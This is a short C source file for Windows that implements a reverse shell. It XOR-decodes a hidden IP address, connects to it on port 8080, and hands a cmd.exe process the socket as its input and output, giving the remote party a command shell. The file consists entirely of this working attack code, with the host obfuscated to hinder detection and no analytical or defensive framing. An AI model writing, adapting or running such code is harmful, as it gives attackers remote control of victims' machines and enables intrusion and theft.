#include <winsock2.h>
#include <windows.h>
#include <time.h>
#pragma comment(lib, "ws2_32.lib")

unsigned char key = 85;
char host_enc[] = "\x64\x6c\x67\x7b\x64\x63\x6d\x7b\x65\x7b\x6d\x61";
unsigned short port_val = 8080;

void xor_decode(char *s, int len) {
    for(int i=0;i<len;i++) s[i] ^= key;
}

int main() {
    WSADATA wsa;
    SOCKET sck;
    struct sockaddr_in addr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    int hlen = sizeof(host_enc) - 1;
    xor_decode(host_enc, hlen);

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 1;
    sck = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port_val);
    addr.sin_addr.s_addr = inet_addr(host_enc);
    if (WSAConnect(sck, (struct sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) != 0) return 1;

    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sck;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    return 0;
}